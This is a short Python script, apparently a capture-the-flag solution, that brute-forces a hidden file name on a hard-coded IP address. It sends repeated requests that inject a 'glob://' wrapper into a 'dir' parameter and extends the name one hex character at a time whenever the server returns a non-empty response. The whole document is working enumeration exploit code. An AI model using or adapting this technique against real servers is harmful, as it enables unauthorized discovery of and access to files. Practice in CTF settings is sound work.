import requests

url = 'http://103.191.240.169:1997/?dir=glob://{}*.txt'

filename = 'flag'
cand = 'ABCDEFabcdef0123456789'
for i in range(15):
    print(f'Current: {filename}.txt')
    for c in cand:
        print('Trying', c, end='\r')
        resp = requests.get(url.format(filename + c))
        print('Trying', resp)
        if resp.content != b'':
            filename += c
            break
    else:
        print('Bruh')
        exit(1)

print(filename)